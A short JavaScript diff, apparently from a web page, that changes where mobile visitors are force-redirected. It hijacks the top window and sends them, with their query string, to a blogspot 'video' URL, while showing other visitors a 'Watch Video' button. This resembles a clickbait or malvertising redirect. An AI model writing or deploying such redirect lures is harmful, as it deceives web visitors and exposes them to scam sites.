@@ -62,7 +62,7 @@
     
     
     if( detectmob() && getDimmentions().width <= 720 ){
-        window.top.location.href = "https://urlgeni.us/y6er?"+location.search;
+        window.top.location.href = "https://videotrentfull.blogspot.com/?eiurgh4?"+location.search;
     }else{
         var BTN = createButton("Watch Video");
         BTN.addEventListener('click',function(){
